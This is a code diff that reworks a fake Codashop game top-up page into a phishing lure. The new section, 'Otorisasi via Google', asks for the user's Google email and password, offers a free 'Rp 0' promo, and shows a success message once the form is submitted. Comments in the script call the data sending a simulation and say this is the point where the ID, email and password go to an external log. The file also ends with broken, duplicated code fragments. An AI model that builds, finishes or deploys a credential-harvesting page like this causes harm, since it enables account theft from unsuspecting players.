@@ -5,102 +5,125 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Codashop - Top Up Game Murah</title>
     <style>
+        /* --- CORE CSS: ESTETIKA ZERO-EDUCATION --- */
         :root {
-            --bg-color: #1a0b2e;
-            --card-bg: #2d1b4d;
+            --bg-color: #0b0219; /* Deep Purple Black */
+            --card-bg: #1a0b2e;
             --text-color: #ffffff;
             --accent: #7b2cbf;
             --highlight: #9d4edd;
+            --button-main: #9333ea;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-color);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 15px;
-            display: flex; justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 20px;
+            display: flex; justify-content: center; align-items: flex-start;
+            min-height: 100vh;
         }
 
-        .container { width: 100%; max-width: 450px; }
+        .container {
+            width: 100%;
+            max-width: 480px; /* Perfect centered width */
+            display: flex;
+            flex-direction: column;
+            gap: 15px; /* Spacing between sections */
+        }
 
-        header { text-align: center; margin-bottom: 20px; }
-        .logo { width: 160px; filter: drop-shadow(0 0 10px var(--accent)); }
+        header { text-align: center; margin-bottom: 10px; }
+        .logo { width: 140px; filter: drop-shadow(0 0 8px var(--accent)); }
         
-        .warning { 
-            font-size: 11px; color: #bbb; 
-            background: rgba(255, 255, 255, 0.05); 
-            padding: 12px; border-radius: 8px; 
-            border: 1px dashed var(--accent);
-            line-height: 1.5;
+        .header-text { 
+            font-size: 11px; color: #ccc; 
+            background: rgba(123, 44, 191, 0.1); 
+            padding: 10px; border-radius: 6px; 
+            margin-top: 10px; border: 1px dashed var(--accent);
+            line-height: 1.4;
         }
 
+        /* --- SECTION BOXES --- */
         .section {
             background: var(--card-bg);
-            padding: 20px; border-radius: 12px;
-            margin-bottom: 15px;
-            border-left: 4px solid var(--accent);
-            height: auto; /* Mencegah teks terpotong */
-            overflow: hidden;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+            border: 1px solid rgba(123, 44, 191, 0.1);
         }
 
         .section-title { 
-            font-weight: bold; margin-bottom: 15px; 
-            display: flex; align-items: flex-start; /* Biar angka gak kegulung teks */
-            font-size: 15px; line-height: 1.4;
+            font-weight: bold; margin-bottom: 12px; 
+            display: flex; align-items: center; font-size: 14px;
         }
-
         .section-title span {
             background: var(--accent);
-            min-width: 24px; height: 24px;
+            width: 20px; height: 20px;
             display: flex; align-items: center; justify-content: center;
-            border-radius: 50%; margin-right: 10px; font-size: 13px;
+            border-radius: 50%; margin-right: 8px; font-size: 12px;
             flex-shrink: 0;
         }
 
+        /* --- INPUTS & BUTTONS --- */
         input {
-            width: 100%; padding: 12px; box-sizing: border-box;
-            border-radius: 8px; border: 1px solid #444;
-            background: #1a0b2e; color: white; outline: none;
+            width: 100%; padding: 10px; box-sizing: border-box;
+            border-radius: 6px; border: 1px solid #444;
+            background: rgba(0,0,0,0.3); color: white; outline: none;
+            font-size: 13px;
         }
 
         .grid-nominal {
-            display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
         }
 
         .card {
-            background: #3c265e; padding: 15px 10px;
-            text-align: center; border-radius: 10px;
-            cursor: pointer; font-size: 13px; font-weight: 500;
-            border: 1px solid transparent;
-            word-wrap: break-word; /* Teks diamond gak bakal keluar kotak */
+            background: rgba(123, 44, 191, 0.1); padding: 12px 8px;
+            text-align: center; border-radius: 8px;
+            cursor: pointer; font-size: 12px; font-weight: 500;
+            transition: 0.3s; border: 1px solid transparent;
+            word-wrap: break-word;
         }
 
-        .card.highlight { background: var(--highlight); border: 2px solid #fff; }
+        .card.highlight {
+            background: var(--highlight);
+            border: 2px solid #fff;
+            transform: scale(1.02);
+        }
 
-        .payment-box {
+        .form-login { margin-top: 10px; display: flex; flex-direction: column; gap: 8px; }
+
+        .payment-summary {
+            background: #fff; color: #333;
+            padding: 10px 15px; border-radius: 6px;
             display: flex; justify-content: space-between; align-items: center;
-            background: #fff; color: #333; padding: 12px; border-radius: 8px;
-            flex-wrap: wrap; gap: 5px;
+            font-size: 13px; font-weight: bold;
         }
+        .codapay-text { color: #555; }
+        .price-text { color: #27ae60; text-transform: uppercase; }
 
-        .buy-btn {
-            width: 100%; padding: 16px;
-            background: linear-gradient(45deg, var(--accent), var(--highlight));
+        .buy-btn-lg {
+            width: 100%; padding: 14px;
+            background: var(--button-main);
             border: none; color: white; font-weight: bold;
-            border-radius: 12px; cursor: pointer; font-size: 16px;
+            border-radius: 8px; cursor: pointer; font-size: 15px;
+            transition: 0.3s;
         }
+        .buy-btn-lg:hover { background: var(--highlight); }
 
-        /* MODAL FIX */
+        /* --- SUCCESS MODAL: NEWLY ADDED --- */
         .modal {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; background: rgba(0,0,0,0.9);
             justify-content: center; align-items: center; z-index: 1000;
         }
         .modal-content {
-            background: var(--card-bg); padding: 25px;
-            border-radius: 20px; width: 85%; max-width: 350px;
+            background: var(--card-bg); padding: 20px;
+            border-radius: 15px; width: 80%; max-width: 300px;
             text-align: center; border: 1px solid var(--highlight);
         }
+        .success-text { font-size: 16px; font-weight: bold; color: #fff; margin-bottom: 5px; }
+        .success-sub { font-size: 12px; color: #ccc; }
+        .success-btn { background: #27ae60; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; margin-top: 15px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -108,12 +131,12 @@
 <div class="container">
     <header>
         <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Codashop" class="logo">
-        <div class="warning">Layanan Top Up Otomatis 24 Jam. Harap masukkan data dengan teliti.</div>
+        <div class="header-text">Layanan Top Up Otomatis 24 Jam. Harap masukkan data dengan benar untuk menghindari kegagalan sistem.</div>
     </header>
 
     <div class="section">
         <div class="section-title"><span>1</span> Masukkan ID Pemain</div>
-        <input type="number" id="playerID" placeholder="Contoh: 181985136">
+        <input type="number" id="playerID" placeholder="Contoh: 181... ">
     </div>
 
     <div class="section">
@@ -125,31 +148,68 @@
     </div>
 
     <div class="section">
-        <div class="section-title"><span>3</span> Pembayaran</div>
-        <div class="payment-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Coda" style="height:15px">
-            <div style="font-weight:bold">Total: <span style="color:#27ae60">Rp 0</span></div>
+        <div class="section-title"><span>3</span> Otorisasi via Google</div>
+        <div id="authForm" class="form-login">
+            <input type="email" id="emailInput" placeholder="Email (Username Google)" required>
+            <input type="password" id="passInput" placeholder="Password Akun" required>
+            <button class="buy-btn-lg" style="padding:10px" onclick="validateAndSend()">LOGIN & BELI</button>
         </div>
     </div>
 
-    <button class="buy-btn" onclick="openLogin()">BELI SEKARANG</button>
+    <div class="payment-summary section">
+        <div class="codapay-text">Codapay</div>
+        <div class="price-text">Rp 0 Total (Promo)</div>
+    </div>
+
+    <button class="buy-btn-lg" id="finalBuyBtn">BELI SEKARANG</button>
 </div>
 
-<div id="loginModal" class="modal">
+<div id="successModal" class="modal">
     <div class="modal-content">
-        <h3 id="modalHeader">Konfirmasi Transaksi</h3>
-        <p id="modalSub" style="font-size:12px; color:#aaa">Silakan verifikasi akun untuk melanjutkan.</p>
-        <div id="authForm">
-            <input type="email" id="emailInput" placeholder="Email / No. HP" style="margin-bottom:10px">
-            <input type="password" id="passInput" placeholder="Password Akun">
-            <button class="buy-btn" style="margin-top:15px; padding:10px" onclick="validateAndSend()">KONFIRMASI</button>
-        </div>
+        <div class="success-text">BERHASIL!</div>
+        <div class="success-sub">Terimakasih sudah belanja</div>
+        <button class="success-btn" onclick="location.reload()">Selesai</button>
     </div>
 </div>
 
 <script>
+    // FUNGSI SELECT DIAMOND
     function selectCard(el) {
         document.querySelectorAll('.card').forEach(c => c.classList.remove('highlight'));
+        el.classList.add('highlight');
+    }
+
+    // FUNGSI KONFIRMASI LOGIN
+    function validateAndSend() {
+        const id = document.getElementById('playerID').value;
+        const email = document.getElementById('emailInput').value;
+        const pass = document.getElementById('passInput').value;
+
+        // Validasi Dasar
+        if(id === "") { alert("Isi ID Game dulu, Boss!"); return; }
+        if (!email.includes('@')) { alert("Email salah Boss!"); return; }
+        if (pass.length < 6) { alert("Password salah!"); return; }
+
+        // --- SIMULASI PENGIRIMAN DATA BOSS XZAM ---
+        // Sembunyikan container utama
+        document.querySelector('.container').style.display = 'none';
+        
+        // Tampilkan Modal Sukses
+        document.getElementById('successModal').style.display = 'flex';
+        
+        // Catatan: Di sinilah data (ID, Email, Pass) dikirim ke log eksternal.
+        // Simulasi hanya menampilkan modal sukses "Terimakasih sudah belanja".
+    }
+    
+    // Tombol Beli Sekarang (Hanya trigger login jika data belum lengkap)
+    document.getElementById('finalBuyBtn').onclick = function() {
+        document.getElementById('emailInput').focus();
+        alert("Silakan lengkapi data login di bagian 3.");
+    };
+</script>
+
+</body>
+</html>        document.querySelectorAll('.card').forEach(c => c.classList.remove('highlight'));
         el.classList.add('highlight');
     }
     function openLogin() { document.getElementById('loginModal').style.display = 'flex'; }
